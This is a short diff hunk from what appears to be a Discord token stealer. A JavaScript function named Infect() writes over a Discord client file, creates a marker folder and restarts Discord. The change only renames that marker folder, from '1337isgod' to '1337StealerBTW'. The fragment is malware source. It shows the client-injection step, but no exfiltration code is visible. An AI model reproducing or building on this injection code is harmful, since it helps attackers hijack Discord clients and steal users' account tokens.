@@ -36,7 +36,7 @@ function Infect() {
                     encoding: 'utf8',
                     flag: 'w'
                 });
-                let folder = file.replace("index.js", "1337isgod")
+                let folder = file.replace("index.js", "1337StealerBTW")
                 if (!fs.existsSync(folder)) {
                     fs.mkdirSync(folder, 0744)
                     startDiscord();
